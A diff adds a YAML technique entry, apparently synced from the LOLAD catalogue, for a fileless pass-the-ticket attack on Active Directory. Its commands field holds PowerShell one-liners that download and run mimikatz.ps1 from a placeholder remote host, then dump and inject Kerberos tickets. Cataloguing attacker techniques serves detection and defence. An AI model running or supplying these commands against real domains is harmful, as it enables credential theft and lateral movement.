@@ -1,0 +1,25 @@
+id: lolad/pass-the-ticket-attack-fileless
+type: technique
+platform: active-directory
+name: Pass-the-Ticket Attack (Fileless)
+phases:
+- discovery
+capabilities:
+- discovery
+privilege_required: domain-user
+sources:
+- project: LOLAD
+  upstream_url: https://lolad-project.github.io
+  license: verify upstream LICENSE
+  upstream_version: 6ed6a25
+  last_synced: '2026-08-25'
+commands:
+- template: 'Dump Kerberos tickets in memory: IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1'');
+    Invoke-Mimikatz -Command ''sekurlsa::tickets'' Use a specific Kerberos ticket: IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1'');
+    Invoke-Mimikatz -Command ''kerberos::ptt '''
+references:
+- https://lolad-project.github.io
+tags:
+- active-directory
+- lolad
+- powershell (fileless)
